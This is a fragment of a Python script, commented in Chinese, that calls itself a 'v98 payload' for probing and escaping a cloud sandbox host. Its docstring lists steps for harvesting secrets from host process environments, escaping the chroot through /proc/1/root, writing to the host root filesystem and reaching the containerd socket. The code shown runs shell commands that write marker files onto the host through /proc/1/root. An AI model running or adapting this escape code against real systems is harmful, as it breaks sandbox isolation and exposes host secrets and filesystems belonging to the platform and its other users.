# -*- coding: utf-8 -*-
"""v98 payload: payload 自身直接宿主面探测 (免 cell API 绕道)
...
v98: A 身份/caps  B 宿主进程全景+environ secrets 过滤  C /proc/1/root 逃逸 chroot
     D 写宿主 rootfs(经 /proc/1/root)  E /run 宿主面(cell.sock/containerd.sock)  F netns/挂载/网络
"""
import os, subprocess, time

OUT = '/vercel/sandbox/v98c.out'
...
def main():
    log('V98 payload start pid=%d uid=%d gid=%d' % (os.getpid(), os.getuid(), os.getgid()))
    ...
    run('D1', 'echo ===WRITE_TMP===; echo V98_HOST_WRITE_MARKER_5566 > /proc/1/root/tmp/v98_write_test.txt 2>&1; '
              'echo rc=$?; ls -la /proc/1/root/tmp/v98_write_test.txt 2>&1; cat /proc/1/root/tmp/v98_write_test.txt 2>&1; '
              'echo ===WRITE_COW===; echo V98_COW_MARKER_7788 > /proc/1/root/vercel/sandbox/v98_from_payload.txt 2>&1; '
              'ls -la /vercel/sandbox/v98_from_payload.txt /proc/1/root/vercel/sandbox/v98_from_payload.txt 2>&1')
